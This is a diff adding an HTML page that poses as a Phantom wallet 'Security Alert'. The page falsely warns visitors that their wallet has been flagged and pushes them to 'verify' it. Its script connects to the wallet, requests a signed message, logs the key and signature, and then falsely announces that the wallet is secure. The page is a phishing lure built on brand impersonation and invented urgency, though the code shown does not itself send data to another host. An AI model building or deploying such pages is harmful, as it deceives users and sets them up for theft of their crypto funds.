@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Phantom Security Alert</title>
+<style>
+body { background-color: #1a1a1a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+.container { text-align: center; padding: 40px; border: 1px solid #333; border-radius: 20px; background: #222; max-width: 400px; }
+.icon{ font-size: 50px; margin-bottom: 20px; color: #ff4d4d; }
+h1 { font-size:24px; margin-bottom: 15px; }
+p { font-size: 16px; color: #ccc; line-height: 1.5; margin-bottom: 30px; }
+.btn { background-color: #f97316; color: white; padding: 12px 24px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.3s; }
+</style>
+
+
+</head>
+<body>
+<div class="container">
+<div class="icon">⚠
+</div>
+<h1>Security Alert</h1>
+<p>Your Phantom wallet has been flagged for suspicious activity. To secure your funds, please verify your wallet immediately.</p>
+<button class="btn" id="verifyBtn">Verify Wallet</button>
+</div>
+<script>
+const verifyBtn = document.getElementById('verifyBtn');
+verifyBtn.addEventListener('click', async () => {
+try {
+const { solana } = window;        if (solana && solana.isPhantom) {
+const response = await solana.connect();       const publicKey = response.publicKey.toString();
+const message = "Verify your identity to secure your Phantom wallet.";
+const encodedMessage = new TextEncoder().encode(message);
+const signedMessage =await solana.signMessage(encodedMessage, "utf-8");
+console.log('Public Key:', publicKey);
+console.log('Signed Message:', signedMessage);
+alert('Verification successful. Your wallet is now secure.');
+} else {
+alert('Phantom wallet not found! Please install Phantom extension.');
+}
+} catch (error) {
+console.error('Error:', error);
+alert('Connection failed. Please try again.');
+}
+});
+</script>
